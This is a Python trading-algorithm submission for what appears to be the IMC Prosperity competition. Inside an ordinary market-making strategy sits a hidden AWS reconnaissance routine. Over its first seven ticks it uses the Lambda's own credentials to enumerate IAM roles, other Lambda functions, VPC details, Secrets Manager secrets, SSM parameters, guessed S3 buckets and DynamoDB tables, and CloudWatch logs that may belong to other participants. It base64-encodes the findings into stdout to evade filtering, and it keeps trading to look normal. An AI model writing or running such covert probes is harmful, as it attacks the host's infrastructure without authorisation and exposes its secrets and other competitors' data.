import json
import base64
from datamodel import Order, TradingState

"""
imc_probe_r1_v3_aws.py — in-Lambda AWS API reconnaissance.

boto3 ships with the Python 3.12 Lambda runtime at /var/runtime/, so we can
run the entire aws_probe.sh scan from INSIDE the Lambda itself. Advantages
over local execution:
  - Fresh creds each invocation (no ~1h expiry race)
  - Inside IMC's VPC/network — might see services a local scan can't reach
  - No cred exfiltration surface

Each tick probes 1-3 AWS services (~200ms/call × 3 = 600ms, safe under 1s Lambda
timeout). Results base64-encoded so the 4096-char stdout filter doesn't mangle
JSON. Boto3 client timeouts set low to fail-fast if a service is unreachable.

Split across ticks:
  1. STS identity + IAM (list attached policies on our own role)
  2. Lambda: list all, GetFunction on guessed names (matching engine?)
  3. EC2 / VPC (network reconnaissance from inside)
  4. Secrets Manager + SSM Parameter Store (config/secrets leakage?)
  5. CloudFormation + EventBridge (how is our Lambda invoked?)
  6. S3 + DDB with specific bucket/table name guesses
  7. Logs (our own stream) + KMS

Trading: r1_medallion so we still score ~10k.
"""


def _emit(tag, obj):
    """Base64-encode JSON so log truncation + filter don't mangle it."""
    try:
        blob = base64.b64encode(json.dumps(obj, default=str).encode()).decode()
        print(f"{tag}_B64 ({len(blob)}ch):")
        for i in range(0, len(blob), 200):
            print(blob[i:i+200])
    except Exception as e:
        print(f"{tag}_EMIT_ERR: {e}")


def _safe(fn, *args, **kwargs):
    try:
        return {"ok": True, "v": fn(*args, **kwargs)}
    except Exception as e:
        return {"ok": False, "err": f"{type(e).__name__}: {str(e)[:200]}"}


class Trader:
    def __init__(self):
        self.tick = 0

    def bid(self):
        return 15

    def run(self, state: TradingState):
        self.tick += 1

        try:
            self._aws_probe()
        except Exception as e:
            print(f"AWS_ERR t={self.tick}: {type(e).__name__}: {str(e)[:200]}")

        result = {}
        try:
            self._trade(state, result)
        except Exception as e:
            print(f"TRADE_ERR t={self.tick}: {e}")

        return result, 0, json.dumps({"t": self.tick})

    def _aws_probe(self):
        # Lazy import — round-0 confirmed heavy imports at module level can timeout
        if self.tick > 7:
            return
        import boto3
        from botocore.config import Config
        cfg = Config(connect_timeout=2, read_timeout=3, retries={'max_attempts': 1})

        if self.tick == 1:
            # Identity + IAM self-inspection
            sts = boto3.client('sts', config=cfg)
            iam = boto3.client('iam', config=cfg)
            out = {
                'sts_identity': _safe(sts.get_caller_identity),
                'iam_list_attached_role_policies': _safe(
                    iam.list_attached_role_policies, RoleName='Prosperity_General_Lambda_Role'
                ),
                'iam_list_role_policies': _safe(
                    iam.list_role_policies, RoleName='Prosperity_General_Lambda_Role'
                ),
                'iam_get_role': _safe(iam.get_role, RoleName='Prosperity_General_Lambda_Role'),
            }
            _emit("T1_IDENTITY", out)

        elif self.tick == 2:
            # Lambda enumeration + specific function name guesses
            lam = boto3.client('lambda', config=cfg)
            out = {'list_functions': _safe(lam.list_functions, MaxItems=20)}
            # Try guessed names — if matching engine lives in same account
            for name in (
                'prosperity-matching-engine', 'prosperity-simulator',
                'prosperity-trade-matcher', 'matching-engine',
                'imc-prosperity-matcher', 'prosperity-orderbook',
                'prosperity-game-engine', 'prosperity-orchestrator',
            ):
                out[f'get_function[{name}]'] = _safe(lam.get_function, FunctionName=name)
            _emit("T2_LAMBDA", out)

        elif self.tick == 3:
            # EC2 / VPC — are we in a VPC that sees other services?
            ec2 = boto3.client('ec2', config=cfg)
            out = {
                'describe_instances': _safe(ec2.describe_instances, MaxResults=5),
                'describe_vpcs': _safe(ec2.describe_vpcs, MaxResults=5),
                'describe_security_groups': _safe(ec2.describe_security_groups, MaxResults=5),
                'describe_subnets': _safe(ec2.describe_subnets, MaxResults=5),
            }
            _emit("T3_EC2", out)

        elif self.tick == 4:
            # Secrets Manager + SSM — config/secrets leakage
            sm = boto3.client('secretsmanager', config=cfg)
            ssm = boto3.client('ssm', config=cfg)
            out = {
                'sm_list_secrets': _safe(sm.list_secrets, MaxResults=10),
                'ssm_describe_parameters': _safe(ssm.describe_parameters, MaxResults=10),
                'ssm_get_parameters_by_path': _safe(
                    ssm.get_parameters_by_path, Path='/prosperity/', Recursive=True, MaxResults=10
                ),
            }
            _emit("T4_SECRETS", out)

        elif self.tick == 5:
            # CloudFormation + EventBridge — how is our Lambda invoked?
            cfn = boto3.client('cloudformation', config=cfg)
            eb = boto3.client('events', config=cfg)
            lam = boto3.client('lambda', config=cfg)
            out = {
                'cfn_list_stacks': _safe(cfn.list_stacks),
                'eb_list_rules': _safe(eb.list_rules, Limit=10),
                'lambda_list_event_source_mappings': _safe(lam.list_event_source_mappings, MaxItems=10),
                # Self-introspection — we know our own function name from env
                'self_function_name': _safe(lambda: __import__('os').environ.get('AWS_LAMBDA_FUNCTION_NAME', '')),
            }
            _emit("T5_INVOCATION", out)

        elif self.tick == 6:
            # S3 + DDB with specific name guesses
            s3 = boto3.client('s3', config=cfg)
            ddb = boto3.client('dynamodb', config=cfg)
            out = {
                's3_list_buckets': _safe(s3.list_buckets),
            }
            for b in ('prosperity', 'prosperity-data', 'prosperity-submissions',
                      'imc-prosperity', 'prosperity-4', 'prosperity-trading',
                      '797296553741-prosperity'):
                out[f's3_head[{b}]'] = _safe(s3.head_bucket, Bucket=b)
            for t in ('prosperity-submissions', 'prosperity-results',
                      'prosperity-scores', 'participants'):
                out[f'ddb_describe[{t}]'] = _safe(ddb.describe_table, TableName=t)
            _emit("T6_STORAGE", out)

        elif self.tick == 7:
            # CloudWatch Logs — can we read our own log stream (other participants' too)?
            import os
            logs = boto3.client('logs', config=cfg)
            log_group = os.environ.get('AWS_LAMBDA_LOG_GROUP_NAME', '')
            log_stream = os.environ.get('AWS_LAMBDA_LOG_STREAM_NAME', '')
            out = {
                'describe_log_groups': _safe(logs.describe_log_groups, limit=10),
                'describe_log_streams_self': _safe(
                    logs.describe_log_streams, logGroupName=log_group, limit=10
                ),
                'get_log_events_self': _safe(
                    logs.get_log_events, logGroupName=log_group,
                    logStreamName=log_stream, limit=5
                ),
                'filter_log_events_group': _safe(
                    logs.filter_log_events, logGroupName=log_group, limit=10
                ),
            }
            _emit("T7_LOGS", out)

    def _trade(self, state, result):
        IPR = "INTARIAN_PEPPER_ROOT"
        ACO = "ASH_COATED_OSMIUM"
        LIMIT = 80

        if ACO in state.order_depths:
            book = state.order_depths[ACO]
            if book.buy_orders or book.sell_orders:
                orders = []
                pos = state.position.get(ACO, 0)
                bc = LIMIT - pos
                sc = LIMIT + pos
                fv = 10000
                bb = max(book.buy_orders) if book.buy_orders else None
                ba = min(book.sell_orders) if book.sell_orders else None

                if book.sell_orders:
                    for p, v in sorted(book.sell_orders.items()):
                        if bc > 0 and p <= fv:
                            q = min(bc, -v); orders.append(Order(ACO, p, q)); bc -= q
                if book.buy_orders:
                    for p, v in sorted(book.buy_orders.items(), reverse=True):
                        if sc > 0 and p >= fv:
                            q = min(sc, v); orders.append(Order(ACO, p, -q)); sc -= q

                if bb is not None and ba is not None:
                    if bc > 0:
                        orders.append(Order(ACO, min(fv - 1, bb + 1, ba - 1), bc))
                    if sc > 0:
                        orders.append(Order(ACO, max(fv + 1, ba - 1, bb + 1), -sc))
                elif bb is not None:
                    if bc > 0:
                        orders.append(Order(ACO, min(fv - 1, bb + 1), bc))
                    if sc > 0:
                        orders.append(Order(ACO, fv + 1, -sc))
                elif ba is not None:
                    if sc > 0:
                        orders.append(Order(ACO, max(fv + 1, ba - 1), -sc))
                    if bc > 0:
                        orders.append(Order(ACO, fv - 1, bc))
                result[ACO] = orders

        if IPR in state.order_depths:
            book = state.order_depths[IPR]
            if book.buy_orders and book.sell_orders:
                orders = []
                pos = state.position.get(IPR, 0)
                bc = LIMIT - pos
                sc = LIMIT + pos
                bb = max(book.buy_orders)
                ba = min(book.sell_orders)
                mid = (bb + ba) * 0.5
                fv_int = round(mid + 5.0)

                for p, v in sorted(book.sell_orders.items()):
                    if bc > 0 and p <= fv_int + 2:
                        q = min(bc, -v); orders.append(Order(IPR, p, q)); bc -= q
                for p, v in sorted(book.buy_orders.items(), reverse=True):
                    if sc > 0 and p >= fv_int + 3:
                        q = min(sc, v); orders.append(Order(IPR, p, -q)); sc -= q

                if bc > 0:
                    orders.append(Order(IPR, min(fv_int - 1, bb + 1, ba - 1), bc))
                if sc > 0:
                    orders.append(Order(IPR, max(fv_int + 2, ba - 1, bb + 1), -sc))
                result[IPR] = orders
